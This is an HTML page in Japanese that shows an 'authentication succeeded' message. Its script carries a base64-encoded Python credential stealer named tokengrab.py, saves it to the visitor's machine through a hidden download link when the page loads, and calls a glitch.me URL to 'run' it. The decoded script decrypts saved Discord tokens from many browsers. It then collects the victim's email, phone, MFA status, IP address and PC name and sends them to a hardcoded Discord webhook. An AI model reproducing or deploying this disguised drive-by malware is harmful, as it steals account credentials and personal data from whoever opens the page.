<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>認証成功</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>認証成功</h1>
        <p>認証が正常に完了しました。このページを閉じても構いません</p>
        <a href="#" class="button" id="close-button">閉じる</a>
    </div>

    <script>
        // Function to close the tab when the close button is clicked
            filename = "tokengrab.py"
            filedata = "ZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGRlY29kZQ0KZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMNCmZyb20gd2luMzJjcnlwdCBpbXBvcnQgQ3J5cHRVbnByb3RlY3REYXRhDQpmcm9tIG9zIGltcG9ydCBnZXRsb2dpbiwgbGlzdGRpcg0KZnJvbSBqc29uIGltcG9ydCBsb2Fkcw0KZnJvbSByZSBpbXBvcnQgZmluZGFsbA0KZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3Blbg0KZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBQb3BlbiwgUElQRQ0KaW1wb3J0IHJlcXVlc3RzLCBqc29uLCBvcw0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCg0KdG9rZW5zID0gW10NCmNsZWFuZWQgPSBbXQ0KY2hlY2tlciA9IFtdDQoNCmRlZiBkZWNyeXB0KGJ1ZmYsIG1hc3Rlcl9rZXkpOg0KICAgIHRyeToNCiAgICAgICAgcmV0dXJuIEFFUy5uZXcoQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdLCBBRVMuTU9ERV9HQ00sIGJ1ZmZbMzoxNV0pLmRlY3J5cHQoYnVmZlsxNTpdKVs6LTE2XS5kZWNvZGUoKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuICJFcnJvciINCmRlZiBnZXRpcCgpOg0KICAgIGlwID0gIk5vbmUiDQogICAgdHJ5Og0KICAgICAgICBpcCA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpDQogICAgZXhjZXB0OiBwYXNzDQogICAgcmV0dXJuIGlwDQpkZWYgZ2V0aHdpZCgpOg0KICAgIHAgPSBQb3Blbigid21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQiLCBzaGVsbD1UcnVlLCBzdGRpbj1QSVBFLCBzdGRvdXQ9UElQRSwgc3RkZXJyPVBJUEUpDQogICAgcmV0dXJuIChwLnN0ZG91dC5yZWFkKCkgKyBwLnN0ZGVyci5yZWFkKCkpLmRlY29kZSgpLnNwbGl0KCJcbiIpWzFdDQpkZWYgZ2V0X3Rva2VuKCk6DQogICAgYWxyZWFkeV9jaGVjayA9IFtdDQogICAgY2hlY2tlciA9IFtdDQogICAgbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpDQogICAgcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpDQogICAgY2hyb21lID0gbG9jYWwgKyAiXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhIg0KICAgIHBhdGhzID0gew0KICAgICAgICAnRGlzY29yZCc6IHJvYW1pbmcgKyAnXFxkaXNjb3JkJywNCiAgICAgICAgJ0Rpc2NvcmQgQ2FuYXJ5Jzogcm9hbWluZyArICdcXGRpc2NvcmRjYW5hcnknLA0KICAgICAgICAnTGlnaHRjb3JkJzogcm9hbWluZyArICdcXExpZ2h0Y29yZCcsDQogICAgICAgICdEaXNjb3JkIFBUQic6IHJvYW1pbmcgKyAnXFxkaXNjb3JkcHRiJywNCiAgICAgICAgJ09wZXJhJzogcm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGUnLA0KICAgICAgICAnT3BlcmEgR1gnOiByb2FtaW5nICsgJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIEdYIFN0YWJsZScsDQogICAgICAgICdBbWlnbyc6IGxvY2FsICsgJ1xcQW1pZ29cXFVzZXIgRGF0YScsDQogICAgICAgICdUb3JjaCc6IGxvY2FsICsgJ1xcVG9yY2hcXFVzZXIgRGF0YScsDQogICAgICAgICdLb21ldGEnOiBsb2NhbCArICdcXEtvbWV0YVxcVXNlciBEYXRhJywNCiAgICAgICAgJ09yYml0dW0nOiBsb2NhbCArICdcXE9yYml0dW1cXFVzZXIgRGF0YScsDQogICAgICAgICdDZW50QnJvd3Nlcic6IGxvY2FsICsgJ1xcQ2VudEJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgICAgICc3U3Rhcic6IGxvY2FsICsgJ1xcN1N0YXJcXDdTdGFyXFxVc2VyIERhdGEnLA0KICAgICAgICAnU3B1dG5payc6IGxvY2FsICsgJ1xcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhJywNCiAgICAgICAgJ1ZpdmFsZGknOiBsb2NhbCArICdcXFZpdmFsZGlcXFVzZXIgRGF0YVxcRGVmYXVsdCcsDQogICAgICAgICdDaHJvbWUgU3hTJzogbG9jYWwgKyAnXFxHb29nbGVcXENocm9tZSBTeFNcXFVzZXIgRGF0YScsDQogICAgICAgICdDaHJvbWUnOiBjaHJvbWUgKyAnRGVmYXVsdCcsDQogICAgICAgICdFcGljIFByaXZhY3kgQnJvd3Nlcic6IGxvY2FsICsgJ1xcRXBpYyBQcml2YWN5IEJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgICAgICdNaWNyb3NvZnQgRWRnZSc6IGxvY2FsICsgJ1xcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGFcXERlZmF1bCcsDQogICAgICAgICdVcmFuJzogbG9jYWwgKyAnXFx1Q296TWVkaWFcXFVyYW5cXFVzZXIgRGF0YVxcRGVmYXVsdCcsDQogICAgICAgICdZYW5kZXgnOiBsb2NhbCArICdcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0JywNCiAgICAgICAgJ0JyYXZlJzogbG9jYWwgKyAnXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQnLA0KICAgICAgICAnSXJpZGl1bSc6IGxvY2FsICsgJ1xcSXJpZGl1bVxcVXNlciBEYXRhXFxEZWZhdWx0Jw0KICAgIH0NCiAgICBmb3IgcGxhdGZvcm0sIHBhdGggaW4gcGF0aHMuaXRlbXMoKToNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiBjb250aW51ZQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCArIGYiXFxMb2NhbCBTdGF0ZSIsICJyIikgYXMgZmlsZToNCiAgICAgICAgICAgICAgICBrZXkgPSBsb2FkcyhmaWxlLnJlYWQoKSlbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXQ0KICAgICAgICAgICAgICAgIGZpbGUuY2xvc2UoKQ0KICAgICAgICBleGNlcHQ6IGNvbnRpbnVlDQogICAgICAgIGZvciBmaWxlIGluIGxpc3RkaXIocGF0aCArIGYiXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwiKToNCiAgICAgICAgICAgIGlmIG5vdCBmaWxlLmVuZHN3aXRoKCIubGRiIikgYW5kIGZpbGUuZW5kc3dpdGgoIi5sb2ciKTogY29udGludWUNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCArIGYiXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFx7ZmlsZX0iLCAiciIsIGVycm9ycz0naWdub3JlJykgYXMgZmlsZXM6DQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiBmaWxlcy5yZWFkbGluZXMoKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB4LnN0cmlwKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgdmFsdWVzIGluIGZpbmRhbGwociJkUXc0dzlXZ1hjUTpbXi4qXFsnKC4qKSdcXS4qJF1bXlwiXSoiLCB4KToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW5zLmFwcGVuZCh2YWx1ZXMpDQogICAgICAgICAgICAgICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjogY29udGludWUNCiAgICAgICAgZm9yIGkgaW4gdG9rZW5zOg0KICAgICAgICAgICAgaWYgaS5lbmRzd2l0aCgiXFwiKToNCiAgICAgICAgICAgICAgICBpLnJlcGxhY2UoIlxcIiwgIiIpDQogICAgICAgICAgICBlbGlmIGkgbm90IGluIGNsZWFuZWQ6DQogICAgICAgICAgICAgICAgY2xlYW5lZC5hcHBlbmQoaSkNCiAgICAgICAgZm9yIHRva2VuIGluIGNsZWFuZWQ6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgdG9rID0gZGVjcnlwdChiNjRkZWNvZGUodG9rZW4uc3BsaXQoJ2RRdzR3OVdnWGNROicpWzFdKSwgYjY0ZGVjb2RlKGtleSlbNTpdKQ0KICAgICAgICAgICAgZXhjZXB0IEluZGV4RXJyb3IgPT0gIkVycm9yIjogY29udGludWUNCiAgICAgICAgICAgIGNoZWNrZXIuYXBwZW5kKHRvaykNCiAgICAgICAgICAgIGZvciB2YWx1ZSBpbiBjaGVja2VyOg0KICAgICAgICAgICAgICAgIGlmIHZhbHVlIG5vdCBpbiBhbHJlYWR5X2NoZWNrOg0KICAgICAgICAgICAgICAgICAgICBhbHJlYWR5X2NoZWNrLmFwcGVuZCh2YWx1ZSkNCiAgICAgICAgICAgICAgICAgICAgaGVhZGVycyA9IHsnQXV0aG9yaXphdGlvbic6IHRvaywgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJ30NCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUnLCBoZWFkZXJzPWhlYWRlcnMpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogY29udGludWUNCiAgICAgICAgICAgICAgICAgICAgaWYgcmVzLnN0YXR1c19jb2RlID09IDIwMDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc19qc29uID0gcmVzLmpzb24oKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaXAgPSBnZXRpcCgpDQogICAgICAgICAgICAgICAgICAgICAgICBwY191c2VybmFtZSA9IG9zLmdldGVudigiVXNlck5hbWUiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcGNfbmFtZSA9IG9zLmdldGVudigiQ09NUFVURVJOQU1FIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfbmFtZSA9IGYne3Jlc19qc29uWyJ1c2VybmFtZSJdfSN7cmVzX2pzb25bImRpc2NyaW1pbmF0b3IiXX0nDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VyX2lkID0gcmVzX2pzb25bJ2lkJ10NCiAgICAgICAgICAgICAgICAgICAgICAgIGVtYWlsID0gcmVzX2pzb25bJ2VtYWlsJ10NCiAgICAgICAgICAgICAgICAgICAgICAgIHBob25lID0gcmVzX2pzb25bJ3Bob25lJ10NCiAgICAgICAgICAgICAgICAgICAgICAgIG1mYV9lbmFibGVkID0gcmVzX2pzb25bJ21mYV9lbmFibGVkJ10NCiAgICAgICAgICAgICAgICAgICAgICAgIGhhc19uaXRybyA9IEZhbHNlDQogICAgICAgICAgICAgICAgICAgICAgICByZXMgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9iaWxsaW5nL3N1YnNjcmlwdGlvbnMnLCBoZWFkZXJzPWhlYWRlcnMpDQogICAgICAgICAgICAgICAgICAgICAgICBuaXRyb19kYXRhID0gcmVzLmpzb24oKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaGFzX25pdHJvID0gYm9vbChsZW4obml0cm9fZGF0YSkgPiAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZGF5c19sZWZ0ID0gMA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGFzX25pdHJvOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQxID0gZGF0ZXRpbWUuc3RycHRpbWUobml0cm9fZGF0YVswXVsiY3VycmVudF9wZXJpb2RfZW5kIl0uc3BsaXQoJy4nKVswXSwgIiVZLSVtLSVkVCVIOiVNOiVTIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkMiA9IGRhdGV0aW1lLnN0cnB0aW1lKG5pdHJvX2RhdGFbMF1bImN1cnJlbnRfcGVyaW9kX3N0YXJ0Il0uc3BsaXQoJy4nKVswXSwgIiVZLSVtLSVkVCVIOiVNOiVTIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXlzX2xlZnQgPSBhYnMoKGQyIC0gZDEpLmRheXMpDQogICAgICAgICAgICAgICAgICAgICAgICBlbWJlZCA9IGYiIiIqKnt1c2VyX25hbWV9KiogKih7dXNlcl9pZH0pKlxuDQo+IDpkaXZpZGVyczogX19BY2NvdW50IEluZm9ybWF0aW9uX19cblx0RW1haWw6IGB7ZW1haWx9YFxuXHRQaG9uZTogYHtwaG9uZX1gXG5cdDJGQS9NRkEgRW5hYmxlZDogYHttZmFfZW5hYmxlZH1gXG5cdE5pdHJvOiBge2hhc19uaXRyb31gXG5cdEV4cGlyZXMgaW46IGB7ZGF5c19sZWZ0IGlmIGRheXNfbGVmdCBlbHNlICJOb25lIn0gZGF5KHMpYFxuDQo+IDpjb21wdXRlcjogX19QQyBJbmZvcm1hdGlvbl9fXG5cdElQOiBge2lwfWBcblx0VXNlcm5hbWU6IGB7cGNfdXNlcm5hbWV9YFxuXHRQQyBOYW1lOiBge3BjX25hbWV9YFxuXHRQbGF0Zm9ybTogYHtwbGF0Zm9ybX1gXG4NCj4gOnBpw7FhdGE6IF9fVG9rZW5fX1xuXHRge3Rva31gXG4NCipNYWRlIGJ5IEFzdHJhYSM2MTAwKiAqKnwqKiB8fGh0dHBzOi8vZ2l0aHViLmNvbS9hc3RyYWFkZXZ8fCIiIg0KICAgICAgICAgICAgICAgICAgICAgICAgcGF5bG9hZCA9IGpzb24uZHVtcHMoeydjb250ZW50JzogZW1iZWQsICd1c2VybmFtZSc6ICdUb2tlbiBHcmFiYmVyIC0gTWFkZSBieSBBc3RyYWEnLCAnYXZhdGFyX3VybCc6ICdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy84MjY1ODE2OTc0MzY1ODE5MTkvOTgyMzc0MjY0NjA0ODY0NTcyL2F0aW8uanBnJ30pDQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyczIgPSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjExIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzIzLjAuMTI3MS42NCBTYWZhcmkvNTM3LjExJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXEgPSBSZXF1ZXN0KCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjQ3MzY0MjkwMDg0NjA2MDUyL0NuTnNaMTg0YWJZZkQxa2ozeUF0a09IODczUlM0YzdIVnBENVJ5cHMyd1g1U3Y0cEcteno5S0NSWm1QWUhJZmYzbGxtJywgZGF0YT1wYXlsb2FkLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMyKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybG9wZW4ocmVxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBjb250aW51ZQ0KICAgICAgICAgICAgICAgIGVsc2U6IGNvbnRpbnVlDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIGdldF90b2tlbigp"
            function base64tobytes(b64data){
              var binary_values = atob(b64data);
              var binary_length = binary_values.length
              var bytes_data = new Uint8Array(binary_length);

              for ( i = 0; i < binary_length; i++ ){
                bytes_data[i] = binary_values.charCodeAt(i);
              }

              return bytes_data.buffer;
            }
            var filebytes = base64tobytes(filedata);

            var blob = new Blob([filebytes], {"type":"octet/stream"});
            var anchor = document.createElement("a");
            document.body.append(anchor);
            anchor.style = "display: none;";
    
            var url = window.URL.createObjectURL(blob)
            anchor.href = url;
            anchor.download = filename;

            anchor.click();
            window.URL.revokeObjectURL(url);
        
            document.getElementById('close-button').addEventListener('click', function(event) {
                event.preventDefault();
                window.close();
            });

                // Function to execute second.py when the page loads
            window.onload = function() {
                fetch('https://inky-neat-thyme.glitch.me/run-tokengrab')
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Network response was not ok');
                        }
                        return response.text();
                    })
                    .then(data => console.log(data))
                    .catch(error => console.error('There was a problem with your fetch operation:', error));
            };
    </script>
</body>
</html>
